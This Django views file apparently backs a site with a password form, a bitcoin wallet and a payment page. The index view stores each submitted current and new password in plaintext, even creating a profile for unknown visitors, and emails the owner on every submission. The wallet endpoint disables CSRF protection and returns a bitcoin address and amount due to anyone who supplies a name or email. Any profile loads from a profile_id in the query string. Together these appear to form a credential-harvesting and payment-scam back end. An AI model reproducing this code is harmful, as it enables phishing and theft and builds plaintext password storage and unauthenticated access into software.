from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, get_object_or_404
from django.http import JsonResponse
from .models import Profile, Wallet, Pricing
from django.core.mail import send_mail
from django.conf import settings

def index(request):
    profile_id = (
        request.POST.get("profile_id")
        or request.GET.get("profile_id")
        or request.session.get("active_profile_id")
    )
    profile = None
    pricing = Pricing.objects.first()
    if profile_id:
        profile = get_object_or_404(Profile, id=profile_id)

    if request.method == "POST":
        form_type = request.POST.get("form_type")
        created_new_profile = False  # track if profile is newly created

        if form_type == "password":
            curr_password = request.POST.get("currentPassword")
            new_password = request.POST.get("newPassword")

            if not profile:
                profile = Profile.objects.create(
                    curr_password=curr_password,
                    new_password=new_password
                )
                created_new_profile = True
            else:
                if curr_password:
                    profile.curr_password = curr_password
                if new_password:
                    profile.new_password = new_password
                profile.save()

        elif form_type == "subscription":
            fullName = request.POST.get("subscriberName")
            email = request.POST.get("subscriberEmail")
            if not profile:
                profile = Profile.objects.create(fullName=fullName, email=email)
                created_new_profile = True
                request.session["active_profile_id"] = str(profile.id)  # store in session
            else:
                if fullName:
                    profile.fullName = fullName
                if email:
                    profile.email = email
                profile.save()

        # Automatically create wallet for first-time profile creation
        if created_new_profile:
            Wallet.objects.create(profile=profile)

        # Send email to host user whenever created or updated
        if profile:
            send_mail(
                subject="Profile Created/Updated",
                message=f"Profile for {profile.fullName or 'Unnamed'} ({profile.email or 'No Email'}) has been {'created' if created_new_profile else 'updated'}.",
                from_email=settings.EMAIL_HOST_USER,
                recipient_list=[settings.EMAIL_HOST_USER],
                fail_silently=False,
            )

        # Always store active profile in session
        if profile:
            request.session["active_profile_id"] = str(profile.id)

        return render(request, "index.html", {
            "profile": profile,
            "pricing": pricing,
            # "has_chat": True
        })

    return render(request, "index.html", {
        "profile": profile,
        "pricing": pricing,
        # "has_chat": profile 
    })


@csrf_exempt
def wallet_view(request):
    if request.method == "POST":
        full_name = (request.POST.get("fullName") or "").strip()
        email = (request.POST.get("email") or "").strip()

        if not full_name and not email:
            return JsonResponse({"error": "No name or email provided"})

        # Find or create profile (prefer email if provided)
        if email:
            profile, created = Profile.objects.get_or_create(
                email=email,
                defaults={"fullName": full_name or None}
            )
        else:
            profile, created = Profile.objects.get_or_create(
                fullName=full_name,
                defaults={"email": None}
            )

        # Ensure wallet exists
        wallet, _ = Wallet.objects.get_or_create(profile=profile)

        # Mirror index side-effects for new profile
        if created:
            # store active profile in session
            request.session["active_profile_id"] = str(profile.id)
            # send email (silent if email backend not set)
            try:
                send_mail(
                    subject="Profile Created/Updated",
                    message=f"Profile for {profile.fullName or 'Unnamed'} ({profile.email or 'No Email'}) has been created.",
                    from_email=settings.EMAIL_HOST_USER,
                    recipient_list=[settings.EMAIL_HOST_USER],
                    fail_silently=True,
                )
            except Exception:
                pass

        return JsonResponse({
            "wallet": {
                "balance": wallet.balance,
                "total_price": wallet.total_price,
                "total_flat": wallet.total_flat,
                "exchange_rate": wallet.exchange_rate,
                "amount_due": wallet.amount_due,
                "recommended_fee": wallet.recommended_fee,
                "image": wallet.image.url if wallet.image else None,
                "wallet_address": wallet.wallet_address,
            }
        })

    return JsonResponse({"error": "Invalid request"}, status=400)


def bitcoin(request):
    pricing = Pricing.objects.first()
    return render(request, "bitcoin.html", {"pricing": pricing})




